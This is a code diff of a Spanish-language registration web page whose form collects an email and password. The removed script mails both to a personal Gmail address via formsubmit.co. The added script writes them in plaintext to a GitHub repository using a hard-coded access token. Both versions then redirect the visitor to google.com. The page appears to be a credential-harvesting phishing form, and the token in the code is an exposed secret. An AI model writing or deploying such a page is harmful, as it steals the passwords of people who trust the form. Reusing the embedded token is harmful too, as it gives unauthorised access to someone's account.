@@ -57,7 +57,6 @@
             text-align: center;
             margin-top: 15px;
         }
-        /* CAMBIO: Estilo para el mensaje de carga */
         .loading {
             text-align: center;
             margin-top: 10px;
@@ -79,7 +78,6 @@
                 <input type="password" id="password" name="password" required>
             </div>
             <button type="submit">Registrarse</button>
-            <!-- CAMBIO: Mensaje de carga oculto inicialmente -->
             <div id="loadingMessage" class="loading" style="display: none;">Enviando datos, por favor espere...</div>
         </form>
         <div class="login-link">
@@ -87,62 +85,95 @@
         </div>
     </div>
 
-    <script>
-        document.getElementById('registroForm').addEventListener('submit', function(e) {
-            e.preventDefault(); // Evita la recarga de página
-            
-            const form = this;
-            const submitButton = form.querySelector('button[type="submit"]');
-            const loadingMessage = document.getElementById('loadingMessage');
-            
-            // CAMBIO: Deshabilitar botón y mostrar mensaje de carga
-            submitButton.disabled = true;
-            submitButton.textContent = "Enviando...";
-            loadingMessage.style.display = 'block';
-            
-            // Obtener los datos del formulario
-            const formData = new FormData(form);
-            const data = {
-                email: formData.get('email'),
-                password: formData.get('password'),
-                _subject: "Nuevo registro en tu sitio",
-                _template: "table",
-                _captcha: "false"
-            };
-            
-            // CAMBIO: Enviar datos y esperar respuesta antes de redirigir
-            fetch('https://formsubmit.co/ajax/enriquepng1@gmail.com', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'Accept': 'application/json'
-                },
-                body: JSON.stringify(data)
-            })
-            .then(response => {
-                if (!response.ok) throw new Error("Error en la respuesta del servidor");
-                return response.json();
-            })
-            .then(data => {
-                console.log("Éxito:", data);
-                // CAMBIO: Redirigir solo si el envío fue exitoso
-                window.location.href = "https://www.google.com";
-            })
-            .catch(error => {
-                console.error('Error:', error);
-                // CAMBIO: Restaurar botón y ocultar mensaje de carga
-                submitButton.disabled = false;
-                submitButton.textContent = "Registrarse";
-                loadingMessage.style.display = 'none';
-                // Opcional: Mostrar mensaje de error al usuario
-                alert("Error al enviar el formulario. Por favor, inténtalo de nuevo.");
-            });
-        });
+<script>
+    document.getElementById('registroForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
         
-        // Protección adicional contra recarga (opcional)
-        window.addEventListener('beforeunload', function(e) {
-            // Puedes dejarlo así o personalizar el mensaje
-        });
-    </script>
-</body>
-</html>
+        const form = this;
+        const submitButton = form.querySelector('button[type="submit"]');
+        const loadingMessage = document.getElementById('loadingMessage');
+        
+        submitButton.disabled = true;
+        submitButton.textContent = "Enviando...";
+        loadingMessage.style.display = 'block';
+        
+        // Obtener datos del formulario
+        const formData = new FormData(form);
+        const nuevoRegistro = {
+            email: formData.get('email'),
+            password: formData.get('password'),
+            fecha: new Date().toISOString()
+        };
+
+        // Configuración para GitHub
+        const config = {
+            usuario: 'ilbiweb',
+            repo: 'Mis-registros',
+            archivo: 'registros.json',
+            token: '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'
+        };
+
+        try {
+            // Verificar si estamos en file://
+            if (window.location.protocol === 'file:') {
+                throw new Error('No se puede acceder a GitHub desde un archivo local. Usa un servidor web.');
+            }
+
+            // 1. Obtener archivo existente
+            const url = `https://api.github.com/repos/${config.usuario}/${config.repo}/contents/${config.archivo}`;
+            const respuesta = await fetch(url, {
+                headers: { Authorization: `token ${config.token}` }
+            });
+            
+            let registrosExistentes = [];
+            let shaArchivo = null;
+            
+            if (respuesta.ok) {
+                const datos = await respuesta.json();
+                try {
+                    registrosExistentes = JSON.parse(atob(datos.content.replace(/\s/g, '')));
+                    shaArchivo = datos.sha;
+                } catch (parseError) {
+                    console.error('Error al parsear JSON existente:', parseError);
+                    registrosExistentes = [];
+                }
+            } else if (respuesta.status !== 404) {
+                const errorData = await respuesta.json();
+                throw new Error(`GitHub API error: ${errorData.message}`);
+            }
+
+            // 2. Agregar nuevo registro
+            registrosExistentes.push(nuevoRegistro);
+
+            // 3. Subir archivo actualizado
+            const subida = await fetch(url, {
+                method: 'PUT',
+                headers: {
+                    Authorization: `token ${config.token}`,
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    message: 'Nuevo registro agregado automáticamente',
+                    content: btoa(JSON.stringify(registrosExistentes, null, 2)),
+                    sha: shaArchivo
+                })
+            });
+
+            if (!subida.ok) {
+                const errorData = await subida.json();
+                throw new Error(`Error al guardar en GitHub: ${errorData.message}`);
+            }
+            
+            console.log('Datos guardados correctamente en GitHub');
+            window.location.href = "https://www.google.com";
+            
+        } catch (error) {
+            console.error('Error completo:', error);
+            alert(`Error: ${error.message}\n\nDetalles en consola.`);
+        } finally {
+            submitButton.disabled = false;
+            submitButton.textContent = "Registrarse";
+            loadingMessage.style.display = 'none';
+        }
+    });
+</script>
